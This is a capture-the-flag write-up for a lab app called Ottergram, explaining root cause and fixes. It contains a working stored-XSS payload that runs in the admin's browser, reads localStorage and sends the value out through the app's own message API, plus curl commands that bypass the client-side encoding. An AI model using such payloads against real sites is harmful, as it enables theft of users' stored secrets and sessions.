# Bug Forge Daily CTF: Ottergram Stored XSS

## Summary

- Target: `https://lab-1780768630415-8zzkm6.labs-app.bugforge.io/login`
- Vulnerability: Stored cross-site scripting in the private message feature
- Impact: JavaScript execution in the admin user's browser, allowing access to the admin user's `localStorage`
- Flag: `bug{8Inm0Sa8iqjHHajHGCRm6xC8XttJMLPA}`

The challenge hint stated that the flag was in the target user's Local Storage. The application stores the flag in `localStorage.flag` for admin users, and the private message view renders message content as raw HTML.

## Methodology

### 1. Reconnaissance

The `/login` route served a React single-page application:

```bash
curl -i https://lab-1780768630415-8zzkm6.labs-app.bugforge.io/login
```

The HTML referenced the main JavaScript bundle:

```html
<script defer="defer" src="/static/js/main.dd5901b1.js"></script>
```

I downloaded the JavaScript bundle and searched it for interesting client-side behavior:

```bash
curl -sS https://lab-1780768630415-8zzkm6.labs-app.bugforge.io/static/js/main.dd5901b1.js -o main.js
rg "localStorage|dangerouslySetInnerHTML|/api/messages|/api/admin|flag" main.js
```

This revealed two important details:

- Admin sessions store the flag in `localStorage.flag`.
- Private messages are rendered using `dangerouslySetInnerHTML`.

The exposed source map also confirmed the original React source:

```bash
curl -sS https://lab-1780768630415-8zzkm6.labs-app.bugforge.io/static/js/main.dd5901b1.js.map -o main.js.map
```

Relevant code from `Messages.js`:

```jsx
<div dangerouslySetInnerHTML={{ __html: message.content }} />
```

Relevant code from `App.js`:

```js
if (response.data.flag) {
  localStorage.setItem('flag', response.data.flag);
}
```

### 2. Account Creation

I registered a normal user account and logged in to obtain a bearer token:

```bash
curl -sS -H 'Content-Type: application/json' \
  -d '{"username":"ATTACKER_USER","email":"ATTACKER_USER@example.com","password":"ATTACKER_PASS","full_name":"Test User"}' \
  https://lab-1780768630415-8zzkm6.labs-app.bugforge.io/api/register
```

```bash
curl -sS -H 'Content-Type: application/json' \
  -d '{"username":"ATTACKER_USER","password":"ATTACKER_PASS"}' \
  https://lab-1780768630415-8zzkm6.labs-app.bugforge.io/api/login
```

### 3. Finding the Admin User

The `/api/users` endpoint listed message recipients:

```bash
curl -sS -H "Authorization: Bearer ATTACKER_TOKEN" \
  https://lab-1780768630415-8zzkm6.labs-app.bugforge.io/api/users
```

The response showed an `admin` user:

```json
[
  {
    "id": 2,
    "username": "admin",
    "profile_picture": "/uploads/otter2.png"
  }
]
```

### 4. Confirming the Stored XSS Sink

The React compose form performs client-side HTML encoding before sending a message. However, this protection is only client-side. Calling the API directly stores raw HTML:

```bash
curl -sS -H "Authorization: Bearer ATTACKER_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"recipient_id":ATTACKER_USER_ID,"content":"<img src=x onerror=\"document.body.setAttribute(`data-xss`,`1`)\">"}' \
  https://lab-1780768630415-8zzkm6.labs-app.bugforge.io/api/messages
```

The inbox returned the raw HTML unchanged:

```bash
curl -sS -H "Authorization: Bearer ATTACKER_TOKEN" \
  https://lab-1780768630415-8zzkm6.labs-app.bugforge.io/api/messages/inbox
```

Because the inbox renders message content with `dangerouslySetInnerHTML`, this raw HTML executes when viewed in the browser.

### 5. Exploitation

The goal was to execute JavaScript in the admin user's browser and send `localStorage.flag` back to the attacker's inbox.

The final payload used the attacker's known bearer token to send a message back to the attacker's account:

```html
<img src=x onerror="fetch('/api/messages',{method:'POST',headers:{'Content-Type':'application/json','Authorization':'Bearer ATTACKER_TOKEN'},body:JSON.stringify({recipient_id:ATTACKER_USER_ID,content:localStorage.getItem('flag')})})">
```

The payload was sent to the admin user:

```bash
curl -sS -H "Authorization: Bearer ATTACKER_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"recipient_id":2,"content":"<img src=x onerror=\"fetch('\''/api/messages'\'',{method:'\''POST'\'',headers:{'\''Content-Type'\'':'\''application/json'\'','\''Authorization'\'':'\''Bearer ATTACKER_TOKEN'\''},body:JSON.stringify({recipient_id:ATTACKER_USER_ID,content:localStorage.getItem('\''flag'\'')})})\">"}' \
  https://lab-1780768630415-8zzkm6.labs-app.bugforge.io/api/messages
```

After the admin bot viewed the message, the flag appeared in the attacker's inbox:

```bash
curl -sS -H "Authorization: Bearer ATTACKER_TOKEN" \
  https://lab-1780768630415-8zzkm6.labs-app.bugforge.io/api/messages/inbox
```

Response excerpt:

```json
{
  "content": "bug{8Inm0Sa8iqjHHajHGCRm6xC8XttJMLPA}"
}
```

## Root Cause

The application relied on client-side HTML encoding before sending messages, but the backend accepted and stored raw HTML. The frontend later rendered stored message content with `dangerouslySetInnerHTML`, creating a stored XSS vulnerability.

The vulnerable pattern was:

```jsx
<div dangerouslySetInnerHTML={{ __html: message.content }} />
```

This is unsafe unless the HTML has been sanitized with a trusted server-side sanitizer and a strict allowlist.

## Remediation

- Sanitize message content on the server before storing it.
- Prefer rendering message content as plain text instead of HTML.
- Avoid `dangerouslySetInnerHTML` for user-controlled content.
- If HTML formatting is required, use a trusted sanitizer such as DOMPurify with a restrictive allowlist.
- Add a Content Security Policy that blocks inline JavaScript, such as removing `unsafe-inline` from `script-src`.
- Treat client-side validation as a usability feature only, not as a security boundary.

## Takeaways

This challenge demonstrates a classic stored XSS issue caused by trusting client-side sanitization. The exploit path was:

1. Register a normal user.
2. Discover the admin user through `/api/users`.
3. Send raw HTML directly to `/api/messages`, bypassing the React form's encoding.
4. Abuse `dangerouslySetInnerHTML` in the inbox.
5. Read `localStorage.flag` in the admin context.
6. Send the flag back through the same message API.
